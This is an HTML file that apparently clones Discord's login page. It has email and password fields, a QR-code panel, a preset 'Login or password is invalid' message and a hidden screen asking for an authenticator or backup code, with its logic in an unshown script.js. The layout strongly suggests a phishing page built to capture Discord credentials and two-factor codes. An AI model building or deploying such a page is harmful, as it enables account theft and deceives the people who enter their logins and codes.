<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Discord | Login</title>
    <link rel="icon" type="image/png" href="https://discord.com">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Main Login Container -->
    <div id="main-container" class="container">
        <div class="login-form-side">
            <h3>Welcome back!</h3>
            <p class="subtitle">We're so excited to see you again!</p>
            <div id="error-msg">Login or password is invalid.</div>
            
            <form id="loginForm">
                <label>Email or Phone Number</label>
                <input type="text" id="email" required autocomplete="off">
                <label>Password</label>
                <input type="password" id="password" required>
                <button type="submit" id="loginBtn">Log In</button>
                <p class="footer">Need an account? <a href="https://discord.com">Register</a></p>
            </form>
        </div>

        <!-- QR Side (Hidden via JS on mobile) -->
        <div id="qr-side" class="qr-side">
            <div class="qr-box" id="qrTarget"></div>
            <h3>Log in with QR Code</h3>
            <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
        </div>
    </div>

    <!-- 2FA Screen (Hidden by default) -->
    <div id="two-factor-screen" class="container tfa-container" style="display: none;">
        <img src="https://discord.com" class="tfa-icon">
        <h3>Enter authentication code</h3>
        <p class="subtitle">Enter the 6-digit code from your authenticator app or a backup code.</p>
        <form id="tfaForm">
            <label>Authentication Code</label>
            <input type="text" id="tfa-code" placeholder="000000" maxlength="8" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
